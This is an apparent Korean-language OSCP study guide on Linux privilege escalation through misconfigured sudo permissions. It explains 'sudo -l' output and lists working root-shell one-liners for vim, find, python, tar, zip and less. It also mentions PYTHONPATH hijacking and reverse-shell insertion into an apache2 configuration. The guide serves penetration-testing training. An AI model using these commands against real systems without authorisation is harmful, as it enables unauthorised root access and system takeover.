# sudo를 이용한 권한 상승 방법 (OSCP 수동 침투)

## 1. sudo 권한 확인

```bash
sudo -l
```

- 현재 사용자가 어떤 명령어를 sudo로 실행할 수 있는지 확인합니다.
- NOPASSWD 옵션이 있으면 비밀번호 없이 실행 가능합니다.

### sudo -l 출력 예시 및 해석

#### 예시 1: 특정 명령어에 대한 NOPASSWD 권한

```
$ sudo -l
User testuser may run the following commands on hostname:
    (ALL) NOPASSWD: /usr/bin/vim
```

- **해석**: testuser는 비밀번호 없이(`NOPASSWD`) vim을 root 권한으로 실행 가능합니다.
- **권한 상승 가능성**: 매우 높음. vim의 `:!` 명령을 통해 쉘 명령어 실행 가능.
- **공격 벡터**: `sudo vim -c ':!/bin/bash'`

#### 예시 2: 모든 명령어에 대한 권한 (비밀번호 필요)

```
$ sudo -l
User testuser may run the following commands on hostname:
    (ALL : ALL) ALL
```

- **해석**: testuser는 모든 명령어를 root 권한으로 실행할 수 있지만, 비밀번호가 필요합니다.
- **권한 상승 가능성**: 비밀번호를 알고 있다면 직접 `sudo bash`로 권한 상승 가능.
- **공격 벡터**: `sudo /bin/bash` (비밀번호 입력 필요)

#### 예시 3: 여러 명령어에 대한 NOPASSWD 권한

```
$ sudo -l
User testuser may run the following commands on hostname:
    (ALL) NOPASSWD: /usr/bin/find, /usr/bin/python
```

- **해석**: testuser는 비밀번호 없이 find와 python을 root 권한으로 실행 가능합니다.
- **권한 상승 가능성**: 매우 높음. 두 가지 방법으로 쉘을 획득할 수 있음.
- **공격 벡터**:
  - `sudo find . -exec /bin/bash \; -quit`
  - `sudo python -c 'import pty;pty.spawn("/bin/bash")'`

#### 예시 4: 특정 사용자로만 실행 가능한 명령어

```
$ sudo -l
User testuser may run the following commands on hostname:
    (web_admin) NOPASSWD: /bin/systemctl restart apache2
```

- **해석**: testuser는 비밀번호 없이 web_admin 사용자로 apache2 서비스 재시작 가능.
- **권한 상승 가능성**: 제한적. apache2 서비스의 설정 파일을 수정할 수 있다면 가능.
- **공격 벡터**: apache2 설정 파일에 reverse shell 코드를 삽입 후 서비스 재시작

#### 예시 5: 와일드카드가 포함된 명령어

```
$ sudo -l
User testuser may run the following commands on hostname:
    (ALL) NOPASSWD: /usr/bin/zip * /tmp/backup.zip
```

- **해석**: testuser는 비밀번호 없이 zip 명령을 사용할 수 있으나, 첫 번째 인자에만 와일드카드 사용 가능.
- **권한 상승 가능성**: 높음. zip의 -T 옵션을 이용해 명령 실행 가능.
- **공격 벡터**: `sudo zip -T --unzip-command="sh -c /bin/bash" /tmp/backup.zip`

#### 예시 6: 환경 변수 설정이 허용된 경우

```
$ sudo -l
User testuser may run the following commands on hostname:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup_script.py
```

- **해석**: testuser는 비밀번호 없이 환경 변수를 설정하며 python3으로 특정 스크립트 실행 가능.
- **권한 상승 가능성**: 높음. PYTHONPATH 환경 변수를 조작하여 코드 실행 가능.
- **공격 벡터**: `sudo PYTHONPATH=/tmp python3 /opt/backup_script.py` (모듈 하이재킹)

### 출력 해석 방법

1. `(ALL)`: 모든 사용자로 명령을 실행할 수 있음을 의미
2. `(root)`: root 사용자로만 명령을 실행할 수 있음
3. `NOPASSWD`: 비밀번호 없이 명령을 실행할 수 있음
4. `ALL`: 모든 명령어를 실행할 수 있음

## 2. 권한 상승 가능한 명령어 탐색

- `sudo -l` 결과에서 다음과 같은 명령어가 있으면 권한 상승이 가능합니다.
- 예시: `vim`, `nano`, `less`, `find`, `python`, `perl`, `awk`, `tar`, `bash`, `sh` 등

### 권한 상승 가능 여부 판단 방법

1. **쉘 직접 접근 명령어**: `/bin/bash`, `/bin/sh` 등이 있으면 직접 쉘 획득 가능
2. **인터프리터**: `python`, `perl`, `ruby` 등이 있으면 코드 실행을 통해 쉘 획득 가능
3. **텍스트 편집기**: `vim`, `nano`, `emacs` 등이 있으면 쉘 명령어 실행 기능을 통해 쉘 획득 가능
4. **파일 검색/조작 도구**: `find`, `awk`, `sed` 등이 있으면 명령어 실행 옵션을 통해 쉘 획득 가능
5. **기타 유틸리티**: `tar`, `zip`, `man`, `less` 등이 있으면 내부 명령어 실행 기능을 통해 쉘 획득 가능

### 주요 확인 사항

- 명령어 앞에 경로(`/usr/bin/`)가 있는지 확인 -> 전체 경로가 지정되어 있으면 해당 바이너리만 실행 가능
- 와일드카드(`*`)가 있는지 확인 -> 추가 옵션이나 인자 전달 가능성
- 환경 변수 설정이 가능한지 확인 -> `LD_PRELOAD`, `LD_LIBRARY_PATH` 등을 이용한 권한 상승 가능성

## 3. 대표적인 권한 상승 예시

### (1) /bin/bash 실행 권한이 있을 때

```bash
sudo /bin/bash
```

### (2) python이 있을 때

```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

### (3) vi/vim이 있을 때

```bash
sudo vim -c ':!/bin/bash'
```

### (4) find가 있을 때

```bash
sudo find . -exec /bin/bash \; -quit
```

### (5) tar가 있을 때

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### (6) less가 있을 때

```bash
sudo less /etc/hosts
!bash
```

## 4. GTFOBins 참고

- [https://gtfobins.github.io/](https://gtfobins.github.io/) 에서 sudo 권한이 있는 바이너리의 권한 상승 방법을 확인할 수 있습니다.

## 5. 주의사항

- OSCP 시험에서는 root shell 획득 후 바로 증거(flag) 파일을 확인하고, 추가적인 파괴적 행위는 금지됩니다.
- 모든 권한 상승 시도는 시험 규정 내에서만 진행해야 합니다.

---

> 위 내용은 OSCP 시험에서 허용되는 수동 침투 방법만을 다룹니다.
